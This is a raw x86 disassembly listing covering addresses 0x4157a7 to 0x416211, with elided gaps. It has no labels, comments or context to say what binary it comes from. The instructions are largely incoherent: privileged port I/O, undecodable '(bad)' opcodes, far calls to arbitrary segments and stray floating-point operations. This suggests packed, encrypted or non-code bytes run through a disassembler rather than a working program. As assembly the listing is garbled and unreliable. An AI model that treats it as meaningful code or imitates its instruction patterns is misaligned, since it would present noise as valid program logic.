  4157a7:	std    
  4157a8:	fmul   DWORD PTR [edx+esi*2]
  4157ab:	dec    ebp
  4157ac:	sbb    BYTE PTR [ebx],bl
  4157ae:	ficom  WORD PTR [eax-0x7772e9c1]
  4157b4:	ror    BYTE PTR [edi-0x7fce3bee],cl
  4157ba:	nop
  4157bb:	mov    ch,0x80
  4157bd:	in     al,dx
  4157be:	mov    ch,bh
  4157c0:	ret    
  4157c1:	add    BYTE PTR [eax-0x2d69374d],bh
  4157c7:	xchg   DWORD PTR [eax+eax*4],edx
  4157ca:	push   ecx
  4157cb:	dec    edx
  4157cc:	dec    eax
  4157cd:	pop    ecx
  4157ce:	ret    
  4157cf:	mov    WORD PTR [eax-0x56],ss
  4157d2:	mov    ecx,0x40a3ce80
  4157d7:	data16 or ah,BYTE PTR [edi]
  4157da:	getsec 
  4157dc:	ds mov edx,?
  4157df:	push   esi
  4157e0:	call   0x9540c09a
  4157e5:	stc    
  4157e6:	out    0xc6,al
  4157e8:	sahf   
  4157e9:	out    0xf,eax
  4157eb:	jl     0x4157f9
  4157ed:	dec    ebp
  4157ee:	or     bh,0xf
  4157f1:	sbb    esp,DWORD PTR [edi+0x3d6634ae]
  4157f7:	aam    0x97
  4157f9:	fwait
  4157fa:	pushf  
  4157fb:	js     0x415873
  4157fd:	rcr    cl,0x87
  415800:	xchg   ebx,eax
  415801:	jae    0x4157e7
  415803:	mov    ebp,DWORD PTR [edx+0x4dc6e3fc]
  415809:	and    ah,ah
  41580b:	lods   al,BYTE PTR ds:[esi]
  41580c:	xor    DWORD PTR [di-0x422],edx
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	ror    DWORD PTR [ecx-0x2e],cl
  415882:	fwait
  415883:	aad    0x31
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR ds:0x88000001,al
  41588d:	(bad)  
  41588f:	sbb    BYTE PTR [ecx-0x31],0x15
  415893:	test   DWORD PTR [edi+edi*8+0x381dba6e],eax
  41589a:	into   
  41589b:	or     BYTE PTR [edi+0x59],bh
  41589e:	jl     0x415876
  4158a0:	push   0x5b6a298c
  4158a5:	aad    0x8a
  4158a7:	and    BYTE PTR [ebx+ebx*1-0x79],bh
  4158ab:	mov    ds:0x30608a4,al
  4158b1:	cdq    
  4158b2:	test   BYTE PTR [ebx+ebp*4-0x1d],ah
  4158b6:	mov    dh,0xeb
  4158b8:	test   DWORD PTR [edi+0x57],edi
  4158bb:	loopne 0x41583e
  4158bd:	mov    al,ds:0x78b8c5bb
  4158c2:	aaa    
  4158c3:	sub    ch,bl
  4158c5:	add    ax,0xd80b
  4158c9:	cmp    DWORD PTR [esi+esi*1],ebp
  4158cc:	fmul   DWORD PTR [edi+0x25f84776]
  4158d2:	cli    
  4158d3:	and    esi,eax
  4158d5:	loope  0x415874
  4158d7:	test   eax,0x75f71a2e
  4158dc:	adc    DWORD PTR [ebx-0x4b],ebx
  4158df:	jb     0x415950
  4158e1:	sub    eax,0x9e739931
  4158e6:	mov    esi,0x93a26282
  4158eb:	sub    eax,0x97336c9d
  4158f0:	push   ebp
  4158f1:	jp     0x4158ef
  4158f3:	fcomp  DWORD PTR [ebp-0x43]
  4158f6:	pusha  
  4158f7:	les    edi,FWORD PTR [ebp-0x378c5de0]
  4158fd:	sbb    al,0x3d
  4158ff:	sbb    ch,BYTE PTR [edx-0x23]
  415902:	mov    ecx,0x90268d85
  415907:	out    dx,eax
  415908:	jecxz  0x4158bb
  41590a:	test   DWORD PTR [esi],ebp
  41590c:	cmp    ch,BYTE PTR [ebx]
  41590e:	and    eax,0xe7e8c04e
  415913:	jne    0x415981
  415915:	fld    TBYTE PTR [edx+0x3f]
  415918:	jl     0x415930
  41591a:	stos   DWORD PTR es:[edi],eax
  41591b:	adc    al,BYTE PTR [edi+0x69]
  41591e:	lock push 0xe5e07d13
  415924:	mov    ch,0x2f
  415926:	jns    0x4158c1
  415928:	out    dx,al
  415929:	loopne 0x415953
  41592b:	pop    edi
  41592c:	arpl   WORD PTR [esi],si
  41592e:	das    
  41592f:	nop
  415930:	xchg   ecx,eax
  415931:	lahf   
  415932:	push   cs
  415933:	inc    esi
  415934:	sbb    esp,ebx
  415936:	adc    dl,dl
  415938:	add    ah,cl
  41593a:	rcr    BYTE PTR [edx+0x5e929b20],cl
  415940:	fwait
  415941:	loop   0x4159b7
  415943:	fwait
  415944:	imul   eax,DWORD PTR [ebp+0x1a],0xffffff9f
  415948:	mov    DWORD PTR [edx+eiz*8],esi
  41594b:	mov    dl,0x2e
  41594d:	shl    BYTE PTR [eax-0x6db2a626],cl
  415953:	int    0x79
  415955:	fdiv   DWORD PTR [ebp+0x34189bfb]
  41595b:	cdq    
  41595c:	xor    esp,DWORD PTR [edi+0x1]
  41595f:	inc    esp
  415960:	fild   QWORD PTR [esi+ecx*4+0x67]
  415964:	cmp    eax,0xf9c98cf0
  415969:	or     BYTE PTR [ebx],bh
  41596b:	jmp    0x415991
  41596d:	fucomip st,st(2)
  41596f:	js     0x415904
  415971:	int    0xd7
  415973:	push   ss
  415974:	pop    edx
  415975:	fcmove st,st(6)
  415977:	push   esp
  415978:	cmc    
  415979:	xchg   ebp,eax
  41597a:	xchg   ebx,eax
  41597b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597c:	arpl   WORD PTR [edx],bp
  41597e:	mov    ebx,0x49f25be4
  415983:	mov    edi,0x368f660
  415988:	xchg   edx,eax
  415989:	mov    eax,edx
  41598b:	or     esp,0x770164f4
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	inc    eax
  415a01:	pop    ecx
  415a02:	inc    esp
  415a03:	nop
  415a04:	ss in  al,0x0
  415a07:	add    BYTE PTR ds:0x33000001,al
  415a0d:	ret    0x8da5
  415a10:	pushf  
  415a11:	popf   
  415a12:	xchg   ebp,eax
  415a13:	addr16 in eax,0xbc
  415a16:	inc    edx
  415a17:	inc    esp
  415a18:	sar    BYTE PTR [edi+0x3a9c5f00],1
  415a1e:	push   edi
  415a1f:	xlat   BYTE PTR ds:[ebx]
  415a20:	adc    ch,bl
  415a22:	loope  0x415a3c
  415a24:	mov    al,ds:0xe49c153e
  415a29:	jmp    0x415a0e
  415a2b:	xor    al,0x50
  415a2d:	and    edx,DWORD PTR ds:0x86f3988b
  415a33:	mov    al,0xc2
  415a35:	mov    bh,0x24
  415a37:	sub    eax,esi
  415a39:	jle    0x4159d8
  415a3b:	retf   
  415a3c:	mov    ax,0xfaef
  415a40:	(bad)  
  415a41:	hlt    
  415a42:	js     0x415ac2
  415a44:	or     DWORD PTR [eax+0x13],edx
  415a47:	xchg   DWORD PTR [edi+edi*1-0x1bb9e9d8],ecx
  415a4e:	popa   
  415a4f:	leave  
  415a50:	lods   eax,DWORD PTR ds:[esi]
  415a51:	pop    ecx
  415a52:	call   0xab8d:0x72c5d268
  415a59:	jns    0x4159e4
  415a5b:	push   ebx
  415a5c:	test   al,0x9f
  415a5e:	xchg   esi,eax
  415a5f:	out    0x64,eax
  415a61:	mov    WORD PTR [eax],cs
  415a63:	test   DWORD PTR [ecx],ebp
  415a65:	into   
  415a66:	sahf   
  415a67:	enter  0x9621,0x68
  415a6b:	popf   
  415a6c:	and    al,0xff
  415a6e:	xchg   edx,eax
  415a6f:	xchg   ecx,eax
  415a70:	dec    edi
  415a71:	cmp    al,BYTE PTR [eax]
  415a73:	scas   eax,DWORD PTR es:[edi]
  415a74:	xchg   edx,eax
  415a75:	pop    edi
  415a76:	jge    0x415a85
  415a78:	les    esp,FWORD PTR gs:[ebx]
  415a7b:	jecxz  0x415a1f
  415a7d:	aad    0x83
  415a7f:	fnsave [ecx+0x3c]
  415a82:	mov    gs,esi
  415a84:	dec    esi
  415a85:	jg     0x415aa1
  415a87:	push   edi
  415a88:	xchg   edi,eax
  415a89:	jno    0x415aed
  415a8b:	std    
  415a8c:	int    0xde
  415a8e:	adc    eax,DWORD PTR [ebp-0x6c81f586]
  415a94:	mov    edx,0x22ede940
  415a99:	outs   dx,DWORD PTR ds:[esi]
  415a9a:	(bad)  
  415a9b:	mov    esp,0x154de95
  415aa0:	add    BYTE PTR [ecx+ecx*1],cl
  415aa3:	daa    
  415aa4:	loopne 0x415a5b
  415aa6:	add    dh,BYTE PTR ds:0x93b6798a
  415aac:	(bad)  
  415aad:	fdivr  st(5),st
  415aaf:	sub    DWORD PTR [ebp-0x25],esp
  415ab2:	outs   dx,BYTE PTR ds:[esi]
  415ab3:	shl    DWORD PTR [edi+eiz*8+0x50],cl
  415ab7:	mov    edi,0xca3a5d12
  415abc:	sbb    BYTE PTR [eax-0x5b],ah
  415abf:	xor    BYTE PTR [ebx+0x4d],bh
  415ac2:	xor    DWORD PTR [ebx+0x18],edi
  415ac5:	mov    DWORD PTR [ecx+0xc],0xf36e259f
  415acc:	loope  0x415ab1
  415ace:	mov    ch,0x2d
  415ad0:	aas    
  415ad1:	call   0x2385:0x70d365aa
  415ad8:	test   DWORD PTR [edx+eiz*1],edx
  415adb:	cmp    bh,BYTE PTR [ecx+0x32a72cbe]
  415ae1:	sahf   
  415ae2:	ficom  DWORD PTR [edx+0x31]
  415ae5:	(bad)  
  415ae6:	dec    ebx
  415ae7:	jno    0x415b01
  415ae9:	mov    WORD PTR [ebp+0x284e5e5a],gs
  415aef:	cmp    DWORD PTR [ecx+0x6b],ecx
  415af2:	or     edi,DWORD PTR [edi+0x2fd8d811]
  415af8:	pop    edx
  415af9:	mov    DWORD PTR [edx-0x31461c51],edx
  415aff:	retf   
  415b00:	ins    BYTE PTR es:[edi],dx
  415b01:	mov    ds,WORD PTR [eax-0x10da65b5]
  415b07:	mov    al,0xe1
  415b09:	sub    BYTE PTR [ebx-0x6c12d576],bl
  415b0f:	adc    esp,ecx
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcom   QWORD PTR [ecx+0x4e]
  415b82:	fcmovnbe st,st(6)
  415b84:	cmp    esp,ebp
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    eax,0x33000001
  415b8d:	gs dec ecx
  415b8f:	aam    0x19
  415b91:	call   0xb2dd185c
  415b96:	pop    ds
  415b97:	add    al,0x66
  415b99:	inc    ebp
  415b9a:	cmp    esi,DWORD PTR [ebx+0x38]
  415b9d:	xor    dl,bl
  415b9f:	xchg   DWORD PTR [eax],esi
  415ba1:	adc    eax,0x2b005a8a
  415ba6:	int    0xd6
  415ba8:	rcl    DWORD PTR [ebp-0x7a1435b6],1
  415bae:	in     al,dx
  415baf:	sti    
  415bb0:	inc    edi
  415bb1:	pop    esi
  415bb2:	xchg   DWORD PTR [ebx+0xd],edx
  415bb5:	mov    esp,0x25b7d0a5
  415bba:	sub    bh,al
  415bbc:	aad    0x33
  415bbe:	ins    DWORD PTR es:[edi],dx
  415bbf:	out    0x37,eax
  415bc1:	sbb    BYTE PTR [ebx+0x3e56af11],cl
  415bc7:	and    al,0x4c
  415bc9:	fistp  DWORD PTR [edi]
  415bcb:	lahf   
  415bcc:	xchg   edx,eax
  415bcd:	or     BYTE PTR [eax+0x5a],ah
  415bd0:	jg     0x415bfb
  415bd2:	push   ebp
  415bd3:	jno    0x415b89
  415bd5:	fwait
  415bd6:	cmp    eax,0x872af32c
  415bdb:	adc    ch,BYTE PTR [edx]
  415bdd:	sbb    dh,BYTE PTR [ebx-0x29]
  415be0:	push   edx
  415be1:	sbb    cl,al
  415be3:	sbb    al,0xf0
  415be5:	sti    
  415be6:	test   DWORD PTR [eax],0x29da5aad
  415bec:	jmp    0x17ef:0xa8f52c01
  415bf3:	and    ch,BYTE PTR [ebx]
  415bf5:	cmp    DWORD PTR [ecx+0x66],edx
  415bf8:	neg    DWORD PTR [esi]
  415bfa:	add    DWORD PTR [ebp-0x2a],ebp
  415bfd:	shl    DWORD PTR [ebx-0x2fe0e75],0x43
  415c04:	in     eax,0x69
  415c06:	dec    esi
  415c07:	cld    
  415c08:	clc    
  415c09:	repnz sub ebp,DWORD PTR [edx+0xa244070]
  415c10:	call   0xbbac7db1
  415c15:	mov    BYTE PTR ds:0x19ec6bd6,cl
  415c1b:	dec    edi
  415c1c:	push   0xc0aa24f0
  415c21:	pop    edx
  415c22:	aaa    
  415c23:	mov    WORD PTR [ebx+ebx*1+0xf],ss
  415c27:	ret    
  415c28:	in     al,0xc
  415c2a:	jmp    0x2065454d
  415c2f:	sar    DWORD PTR ds:0xe93df6da,1
  415c35:	mov    esi,0x879ab3fe
  415c3a:	jo     0x415c82
  415c3c:	aaa    
  415c3d:	push   esi
  415c3e:	mov    esi,0x76b8806d
  415c43:	jnp    0x415be3
  415c45:	dec    eax
  415c46:	and    al,0x7d
  415c48:	mov    ebx,0xa51e2e28
  415c4d:	test   al,0xb5
  415c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c50:	sub    eax,0x5586198b
  415c55:	ret    
  415c56:	fisttp WORD PTR ds:0x4f3a00e9
  415c5c:	mov    eax,0x3dca5964
  415c61:	loop   0x415c95
  415c63:	adc    bh,BYTE PTR [edx]
  415c65:	sbb    dl,BYTE PTR [ebx]
  415c67:	imul   ebp,DWORD PTR [esi],0x6e
  415c6a:	ds jmp 0x2de1ae22
  415c70:	leave  
  415c71:	aad    0x21
  415c73:	add    DWORD PTR [edi],ebp
  415c75:	fwait
  415c76:	adc    DWORD PTR [edx],ebp
  415c78:	mov    dh,BYTE PTR [ecx+0x39ffa956]
  415c7e:	inc    eax
  415c7f:	sar    BYTE PTR [ebx+edx*1],0x2b
  415c83:	call   0x387c809a
  415c88:	cld    
  415c89:	push   esp
  415c8a:	fwait
  415c8b:	ins    BYTE PTR es:[edi],dx
  415c8c:	int    0x5c
  415c8e:	popf   
  415c8f:	push   ebp
  415c90:	jnp    0x415c92
	...
  415cf2:	add    BYTE PTR [eax],al
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xf6ace41f
  415d03:	and    BYTE PTR [eax-0x1a],al
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    eax,0xf7000001
  415d0d:	mul    BYTE PTR [eax+0x13]
  415d10:	enter  0xe3d3,0xa8
  415d14:	lds    eax,FWORD PTR [edx]
  415d16:	sets   bh
  415d19:	xor    al,0xb8
  415d1b:	mov    esp,0x47e83558
  415d20:	test   DWORD PTR [ebx],esp
  415d22:	xchg   ebx,eax
  415d23:	in     al,dx
  415d24:	dec    ebx
  415d25:	mov    esi,0xbcc70725
  415d2a:	xchg   esi,eax
  415d2b:	push   ecx
  415d2c:	int    0x15
  415d2e:	push   ebp
  415d2f:	jae    0x415d1e
  415d31:	fs sti 
  415d33:	sbb    dh,dl
  415d35:	sahf   
  415d36:	aas    
  415d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d38:	pop    ebp
  415d39:	sbb    DWORD PTR [edi],eax
  415d3b:	inc    esi
  415d3c:	push   edx
  415d3d:	adc    ebx,edi
  415d3f:	jnp    0x415d20
  415d41:	push   ebx
  415d42:	stc    
  415d43:	imul   ebp,DWORD PTR [esi],0xda28e945
  415d49:	loope  0x415cde
  415d4b:	push   0x884dd7dc
  415d50:	push   0xffffffbc
  415d52:	mov    bl,0x56
  415d54:	scas   al,BYTE PTR es:[edi]
  415d55:	or     DWORD PTR [eax],edi
  415d57:	jne    0x415da2
  415d59:	shr    edi,cl
  415d5b:	cmp    eax,esp
  415d5d:	call   0xfdfc:0x6e6cebc3
  415d64:	adc    al,0xa5
  415d66:	xchg   edi,ebx
  415d68:	add    eax,esi
  415d6a:	outs   dx,BYTE PTR ds:[esi]
  415d6b:	iret   
  415d6c:	jge    0x415de4
  415d6e:	jmp    0x514f:0xd953fbf3
  415d75:	xor    ah,BYTE PTR [esi]
  415d77:	adc    BYTE PTR [esi-0x24961fae],al
  415d7d:	push   ds
  415d7e:	iret   
  415d7f:	dec    ecx
  415d80:	push   0x58
  415d82:	dec    esp
  415d83:	pop    eax
  415d84:	inc    eax
  415d85:	pop    edi
  415d86:	mov    BYTE PTR [esi],dh
  415d88:	dec    ecx
  415d89:	cdq    
  415d8a:	pop    esi
  415d8b:	mov    WORD PTR [edi+0x30385553],gs
  415d91:	cmp    BYTE PTR [edi+0x257d51c],al
  415d97:	cmp    ch,BYTE PTR [eax]
  415d99:	jg     0x415dde
  415d9b:	cdq    
  415d9c:	mov    edi,0x7be0a013
  415da1:	jg     0x415e10
  415da3:	or     eax,0x46f74aa8
  415da8:	(bad)  
  415da9:	pop    esp
  415daa:	clc    
  415dab:	in     al,0x51
  415dad:	mov    ds:0xede000c7,eax
  415db2:	mov    ds:0x3ae91439,al
  415db7:	dec    ebx
  415db8:	push   edx
  415db9:	int    0xf5
  415dbb:	mov    BYTE PTR [ebp+0x60],ch
  415dbe:	fwait
  415dbf:	lea    edi,[edx]
  415dc1:	inc    esp
  415dc2:	aaa    
  415dc3:	ins    DWORD PTR es:[edi],dx
  415dc4:	lahf   
  415dc5:	xchg   edx,eax
  415dc6:	mov    ebx,0xc2bc9932
  415dcb:	jle    0x415e0d
  415dcd:	pop    ebx
  415dce:	mov    WORD PTR [edi+eiz*8],cs
  415dd1:	mov    al,BYTE PTR [eax+eiz*4]
  415dd4:	sub    esp,ecx
  415dd6:	aam    0x86
  415dd8:	popf   
  415dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dda:	lds    esp,FWORD PTR [ebp+0x8d286e4]
  415de0:	and    eax,0x2eeb0491
  415de5:	mov    al,ds:0x3eb4f253
  415dea:	lahf   
  415deb:	xchg   edi,eax
  415dec:	loop   0x415d7d
  415dee:	repz mov edx,0x8c27a8bd
  415df4:	daa    
  415df5:	lahf   
  415df6:	aas    
  415df7:	lds    ebx,FWORD PTR [edx]
  415df9:	jno    0x415e20
  415dfb:	sbb    ecx,DWORD PTR [ebx+0x6f]
  415dfe:	out    dx,al
  415dff:	ins    DWORD PTR es:[edi],dx
  415e00:	popa   
  415e01:	imul   ebp,DWORD PTR [ecx-0xaeb0cd9],0x24
  415e08:	fisub  WORD PTR [ecx+0x3ea04457]
  415e0e:	mov    ebx,0x954c
	...
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x6e]
  415e81:	iret   
  415e82:	ficom  DWORD PTR [edi+0x45]
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0x5a000001,al
  415e8d:	out    dx,al
  415e8e:	leave  
  415e8f:	jbe    0x415f01
  415e91:	inc    edx
  415e92:	and    dl,BYTE PTR [edx+ecx*2]
  415e95:	(bad)  
  415e97:	xchg   esi,eax
  415e98:	xor    BYTE PTR [esi],bl
  415e9a:	dec    esi
  415e9b:	jl     0x415e95
  415e9d:	inc    ecx
  415e9e:	jmp    0x415e62
  415ea0:	mov    ds:0x5151bf86,al
  415ea5:	gs cli 
  415ea7:	xchg   ebp,eax
  415ea8:	cwde   
  415ea9:	addr16 addr16 pop edx
  415eac:	pushf  
  415ead:	adc    DWORD PTR [esp],esp
  415eb0:	jne    0x415eeb
  415eb2:	push   eax
  415eb3:	cmp    cl,BYTE PTR [eax-0x3facf297]
  415eb9:	loopne 0x415f10
  415ebb:	or     eax,0x63dfa905
  415ec0:	fiadd  WORD PTR [eax+ecx*8-0x2c]
  415ec4:	pusha  
  415ec5:	dec    edi
  415ec6:	mov    al,0x76
  415ec8:	shl    ebp,1
  415eca:	repz inc edi
  415ecc:	in     al,dx
  415ecd:	dec    esi
  415ece:	mov    DWORD PTR [ebx-0x58],edx
  415ed1:	mov    ?,WORD PTR [edi+0x10]
  415ed4:	pop    ds
  415ed5:	and    ebx,DWORD PTR [edi+0x73]
  415ed8:	(bad)  
  415ed9:	or     ebp,ebp
  415edb:	pop    ds
  415edc:	stos   DWORD PTR es:[edi],eax
  415edd:	inc    esi
  415ede:	xor    eax,0xbec4fd1c
  415ee3:	xchg   edx,eax
  415ee4:	mov    ds:0x6d8218b5,eax
  415ee9:	in     eax,dx
  415eea:	and    eax,0x402d6e1a
  415eef:	dec    edi
  415ef0:	mov    eax,ds:0x166ea6b5
  415ef5:	cmp    edx,ebp
  415ef7:	pop    ds
  415ef8:	stc    
  415ef9:	loop   0x415eb6
  415efb:	inc    eax
  415efc:	ja     0x415e89
  415efe:	nop
  415eff:	sub    edi,DWORD PTR [edi-0xb]
  415f02:	add    edx,DWORD PTR [ebx-0x40c16872]
  415f08:	call   ecx
  415f0a:	sahf   
  415f0b:	jmp    0x45a6:0x87b19373
  415f12:	or     eax,esi
  415f14:	(bad)  
  415f15:	mov    al,ds:0x2f0a8127
  415f1a:	ins    DWORD PTR es:[edi],dx
  415f1b:	shl    BYTE PTR [edi-0x1ac2c0f0],cl
  415f21:	hlt    
  415f22:	das    
  415f23:	cmp    edx,esi
  415f25:	call   0xc3ff:0x5a08bb6e
  415f2c:	add    BYTE PTR [ebx-0x12],dh
  415f2f:	mov    fs,esi
  415f31:	sbb    DWORD PTR [eax+ecx*8],esp
  415f34:	lds    esi,FWORD PTR [esi+0x4adf97f6]
  415f3a:	dec    eax
  415f3b:	pop    ss
  415f3c:	lods   al,BYTE PTR ds:[esi]
  415f3d:	clc    
  415f3e:	test   BYTE PTR [ebx],dh
  415f40:	shl    BYTE PTR [ecx-0x16010702],1
  415f46:	faddp  st(2),st
  415f48:	jmp    0x1d10:0xa9fe59d7
  415f4f:	mov    DWORD PTR [esi-0x2fbdef76],edi
  415f55:	js     0x415fc2
  415f57:	xchg   BYTE PTR [edi],bl
  415f59:	sbb    esi,0xed1fe1ce
  415f5f:	jns    0x415fd0
  415f61:	imul   DWORD PTR [esi+0x261b3dfa]
  415f67:	adc    edi,DWORD PTR ds:0xb7010cde
  415f6d:	or     BYTE PTR [esi+0x7ce057c0],0x86
  415f74:	stc    
  415f75:	jno    0x415ff2
  415f77:	and    al,0xae
  415f79:	lea    di,[eax+esi*8+0x54]
  415f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f7f:	dec    ebx
  415f80:	popf   
  415f81:	fist   WORD PTR [edi]
  415f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f84:	addr16 mov bh,0xc9
  415f87:	fs adc cl,dl
  415f8a:	nop
  415f8b:	dec    esi
  415f8c:	lds    esp,FWORD PTR [eax+0x97fbbd]
	...
  415ff2:	add    BYTE PTR [eax],al
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	mov    bl,0xc0
  416002:	mov    ebx,0xe84a49
  416007:	add    BYTE PTR ds:0x9a000001,al
  41600d:	jle    0x415f96
  41600f:	inc    edi
  416010:	fs int 0xb
  416013:	mov    eax,ds:0x44c332b7
  416018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416019:	mov    ebp,0xa10b788e
  41601e:	dec    ebp
  41601f:	stos   DWORD PTR es:[edi],eax
  416020:	pop    esp
  416021:	and    ch,BYTE PTR [eax-0x27a2137e]
  416027:	jmp    0x427d7aeb
  41602c:	jae    0x41604b
  41602e:	push   ss
  41602f:	cs mov esp,0x537120b0
  416035:	es xor edx,ecx
  416038:	mov    al,0xa
  41603a:	mov    edi,0x4a3e8641
  41603f:	mov    edi,eax
  416041:	rol    BYTE PTR [edx],cl
  416043:	stc    
  416044:	pop    esp
  416045:	std    
  416046:	setge  BYTE PTR [ecx-0x5ddbf6b6]
  41604d:	loope  0x4160b3
  41604f:	int3   
  416050:	ins    BYTE PTR es:[edi],dx
  416051:	in     al,dx
  416052:	jne    0x416009
  416054:	out    0xe7,al
  416056:	push   eax
  416057:	icebp  
  416058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416059:	mov    ebx,0x48da48f9
  41605e:	fcmovu st,st(7)
  416060:	data16 je 0x4160c6
  416063:	jmp    0xbf39:0x12d5dd01
  41606a:	jl     0x41609b
  41606c:	pushf  
  41606d:	out    0x82,al
  41606f:	or     DWORD PTR [ebx+0x4713263a],esi
  416075:	into   
  416076:	jne    0x41606d
  416078:	sub    edi,ebp
  41607a:	jns    0x41600d
  41607c:	sbb    al,BYTE PTR [ebp-0x67]
  41607f:	mov    edi,0x128eca84
  416084:	jo     0x41607d
  416086:	sbb    eax,0x70fa3c58
  41608b:	loopne 0x416028
  41608d:	fdiv   DWORD PTR [ecx-0x102a272f]
  416093:	push   eax
  416094:	mov    esp,0x8c23e4a2
  416099:	rcr    DWORD PTR [ebx-0x7389c207],0x2e
  4160a0:	or     eax,0xa3f46d8a
  4160a5:	rcr    ebx,cl
  4160a7:	repz mov al,BYTE PTR [eax+0x6032ba6f]
  4160ae:	ror    BYTE PTR [ecx],0xa3
  4160b1:	mov    eax,0x8fa39e84
  4160b6:	sbb    DWORD PTR [eax+0x204c6713],esp
  4160bc:	dec    esi
  4160bd:	loop   0x4160fd
  4160bf:	xchg   esp,ecx
  4160c1:	loopne 0x41608d
  4160c3:	lods   eax,DWORD PTR ds:[esi]
  4160c4:	out    0xd5,eax
  4160c6:	mov    eax,0xb19e12be
  4160cb:	xchg   ecx,eax
  4160cc:	das    
  4160cd:	int3   
  4160ce:	mov    al,0x20
  4160d0:	sub    BYTE PTR [ebp-0x38],dh
  4160d3:	in     al,dx
  4160d4:	test   BYTE PTR [eax],al
  4160d6:	push   ebp
  4160d7:	or     esi,DWORD PTR [edx-0x5a]
  4160da:	pop    esi
  4160db:	xor    bl,bh
  4160dd:	call   0xa3a0:0x79b257a8
  4160e4:	cs inc edi
  4160e6:	pushf  
  4160e7:	mov    ch,0xa9
  4160e9:	mov    WORD PTR ds:0x3b37867a,cs
  4160ef:	push   0xb12ac62b
  4160f4:	add    ebx,DWORD PTR [ecx]
  4160f6:	ins    BYTE PTR es:[edi],dx
  4160f7:	(bad)  
  4160f8:	rcr    ecx,cl
  4160fa:	dec    edx
  4160fb:	fadd   DWORD PTR [ecx+0x18]
  4160fe:	pusha  
  4160ff:	pause  
  416101:	je     0x416172
  416103:	pop    ebp
  416104:	jae    0x4160ce
  416106:	pop    edx
  416107:	repz ss hlt 
  41610a:	jae    0x41609c
  41610c:	mov    esi,0xd47b8dbc
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x7a6fa9f3
  416183:	cdq    
  416184:	dec    edi
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	cmp    cl,dl
  41618e:	jne    0x41611e
  416190:	fs fwait
  416192:	call   0xfd9adfdc
  416197:	shl    BYTE PTR fs:[eax],cl
  41619a:	hlt    
  41619b:	icebp  
  41619c:	jns    0x416177
  41619e:	mov    eax,ebp
  4161a0:	mov    ah,0xc
  4161a2:	outs   dx,DWORD PTR ds:[esi]
  4161a3:	cmc    
  4161a4:	add    edi,edi
  4161a6:	lods   eax,DWORD PTR ds:[esi]
  4161a7:	push   ebp
  4161a8:	cmp    BYTE PTR [esi],0x49
  4161ab:	fild   WORD PTR [eax-0xb]
  4161ae:	and    BYTE PTR [eax],dl
  4161b0:	jbe    0x41614b
  4161b2:	(bad)  
  4161b3:	retf   0x8951
  4161b6:	inc    ebx
  4161b7:	aad    0xd1
  4161b9:	jne    0x4161d9
  4161bb:	imul   esi,DWORD PTR [eax-0x38],0x13
  4161bf:	mov    dh,0x51
  4161c1:	dec    edi
  4161c2:	in     eax,dx
  4161c3:	pop    ecx
  4161c4:	out    dx,al
  4161c5:	adc    esi,eax
  4161c7:	jo     0x416222
  4161c9:	popf   
  4161ca:	idiv   BYTE PTR [edi]
  4161cc:	push   eax
  4161cd:	sub    bh,bl
  4161cf:	adc    DWORD PTR [ebp-0x3753f2c3],edi
  4161d5:	push   ebp
  4161d6:	(bad)  
  4161d8:	xchg   ebp,eax
  4161d9:	xchg   edx,eax
  4161da:	mov    ebx,0xf49d7624
  4161df:	adc    eax,DWORD PTR [edx+0x3e]
  4161e2:	(bad)  
  4161e3:	scas   al,BYTE PTR es:[edi]
  4161e4:	fistp  QWORD PTR [edi+edx*1-0x6d1c2565]
  4161eb:	mov    edx,0xa7376ac8
  4161f0:	pop    esi
  4161f1:	push   eax
  4161f2:	in     eax,0xed
  4161f4:	fisubr DWORD PTR [edx+0x5]
  4161f7:	iret   
  4161f8:	hlt    
  4161f9:	pop    eax
  4161fa:	sbb    DWORD PTR [eax],ecx
  4161fc:	dec    ecx
  4161fd:	fnstenv [ebp+ebx*4+0x6b0d46e]
  416204:	sar    edx,cl
  416206:	lods   eax,DWORD PTR ds:[esi]
  416207:	jns    0x41619f
  416209:	push   eax
  41620a:	in     al,0x26
  41620c:	jbe    0x41624c
  41620e:	or     BYTE PTR [esi-0x25],dh
  416211:	ja     0x416253
